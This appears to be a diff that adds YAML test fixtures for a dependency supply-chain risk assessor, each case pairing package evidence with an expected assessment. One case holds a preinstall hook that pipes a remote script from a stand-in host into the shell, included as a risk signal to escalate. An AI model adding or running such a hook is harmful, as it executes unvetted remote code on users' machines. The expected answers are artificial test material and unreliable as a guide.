@@ -1,0 +1,75 @@
+deep_tree_contextualized:
+  description: Deep transitive tree that should not be escalated on depth alone.
+  dependency_tree:
+    direct: 15
+    transitive: 142
+    max_depth: 11
+  lower_risk_evidence:
+    all_transitive_deps_pinned_in_lockfile: true
+    integrity_hash_coverage: 100
+    production_audit_current: true
+    publishers_verified: true
+    recent_releases_present: true
+  expected_assessment:
+    depth_signal: Contextual Risk
+    action: Monitor unless another risk signal appears
+
+lockfile_bisectability_gap:
+  description: Hashes exist today but historical deployments cannot be reproduced.
+  lockfile:
+    file: package-lock.json
+    integrity_hash_coverage: 100
+    committed_to_version_control: true
+    historical_versions_preserved: false
+    regenerated_on_each_install: true
+  expected_assessment:
+    bisectability_score: Weak
+    action: Preserve lockfile history and tie releases to exact lockfile revisions
+
+provenance_chain_degradation:
+  description: Verified direct dependency pulls in unverified stale transitive package.
+  direct_dependency:
+    name: "@scope/pkg-a"
+    version: "1.2.3"
+    publisher_verified: true
+    attestation: SLSA-L2-Sigstore
+  transitive_dependency:
+    name: pkg-c
+    version: "0.9.8"
+    depth: 4
+    publisher_verified: false
+    attestation: none
+    maintainer_count: 1
+    last_publish_age_years: 3
+  expected_assessment:
+    provenance_degradation: true
+    action: Escalate transitive component for maintainer/provenance review
+
+dependency_confusion_routing:
+  description: Scoped private package with routing evidence should be lower risk.
+  dependency:
+    name: "@internal/core"
+    scope: "@internal"
+    registry_routing:
+      npmrc: "@internal:registry=https://private-registry.example.com/"
+      lockfile_resolved_url: "https://private-registry.example.com/@internal/core/-/core-1.4.0.tgz"
+  expected_assessment:
+    public_fallback_possible: false
+    risk: Low
+    action: Document routing evidence instead of flagging by name alone
+
+independent_package_risk_score:
+  description: Package is not a typosquat but still has risky supply-chain signals.
+  dependency:
+    name: color-name
+    publisher_verified: false
+    downloads_per_week: 150
+    age_months: 6
+    install_scripts:
+      preinstall: "curl http://example.invalid/install.sh | sh"
+    maintainer_count: 1
+    provenance: none
+  expected_assessment:
+    typosquat_name_match: false
+    supply_chain_risk_score: 8
+    action: Escalate due to install script, low adoption, unverified publisher, and missing provenance
